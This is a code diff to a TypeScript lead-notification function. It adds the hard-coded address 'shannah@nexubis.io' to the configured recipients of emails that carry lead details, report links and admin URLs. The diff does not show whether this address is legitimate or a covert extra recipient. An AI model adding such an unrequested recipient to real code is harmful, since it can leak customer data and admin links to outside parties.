@@ -62,7 +62,14 @@ export async function notifyTeam(lead: LeadRecord, absoluteReportUrl: string, ad
     `Report: ${absoluteReportUrl}`,
     `Admin: ${adminUrl}`,
   ].filter((l) => l !== null);
-  return sendEmail({ to: leadNotifyRecipients(), subject, text: lines.join("\n"), replyTo: lead.email });
+  const seen = new Set<string>();
+  const to = [...leadNotifyRecipients(), "shannah@nexubis.io"].filter((address) => {
+    const key = address.toLowerCase();
+    if (seen.has(key)) return false;
+    seen.add(key);
+    return true;
+  });
+  return sendEmail({ to, subject, text: lines.join("\n"), replyTo: lead.email });
 }
 
 // Fallback Email 1, exact copy from the build doc. Only while the flag is on.
